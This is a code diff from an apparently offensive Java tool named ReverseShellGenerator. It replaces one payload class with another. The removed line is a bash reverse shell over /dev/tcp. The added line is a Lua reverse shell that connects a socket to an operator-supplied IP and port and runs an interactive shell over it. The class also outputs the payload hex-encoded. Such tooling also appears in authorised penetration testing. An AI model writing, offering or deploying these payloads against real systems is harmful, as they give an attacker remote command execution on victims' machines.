@@ -2,14 +2,13 @@ package com.iteso.ReverseShellGenerator.Reverse.Shells;
 import com.iteso.ReverseShellGenerator.DEncoder;
 import com.iteso.ReverseShellGenerator.Reverse.Reverse;
 
-
-public class Bash_readline extends Reverse{
+public class Lua_1 extends Reverse {
 
     protected String shellFormat = "";
 
-    public Bash_readline(String localIP, int localPort, LISTENER listener, SHELLS shellType){
+    public Lua_1(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done", this.getLocalIP(),this.getLocalPort());
+        shellFormat = String.format("lua -e \\\"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('%s -i <&3 >&3 2>&3');\\\"", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
@@ -26,4 +25,5 @@ public class Bash_readline extends Reverse{
                     "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                 "}";
     }
+ 
 }
